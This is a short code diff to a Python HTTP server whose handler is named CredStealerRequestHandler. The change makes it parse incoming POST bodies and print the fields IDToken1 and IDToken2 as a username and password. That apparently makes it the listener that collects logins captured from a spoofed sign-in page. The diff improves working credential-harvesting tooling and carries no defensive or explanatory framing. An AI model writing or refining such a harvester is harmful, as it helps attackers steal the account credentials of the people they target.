@@ -13,12 +13,12 @@ class CredStealerRequestHandler(http.server.BaseHTTPRequestHandler):
         data_string = self.rfile.read(int(self.headers["Content-Length"]))
         self.send_response(http.HTTPStatus.OK)
         self.end_headers()
-        real_data = data_string.decode("utf-8").split('&')
-        print('username: ' + real_data[0])
-        print('password: ' + real_data[1])
+        real_data = urllib.parse.parse_qs(data_string.decode("utf-8"))
+        print('username: ' + real_data["IDToken1"][0])
+        print('password: ' + real_data["IDToken2"][0])
     def do_GET(self):
         pass
-        
+
 
 parser = argparse.ArgumentParser()
 parser.add_argument('port', action='store',
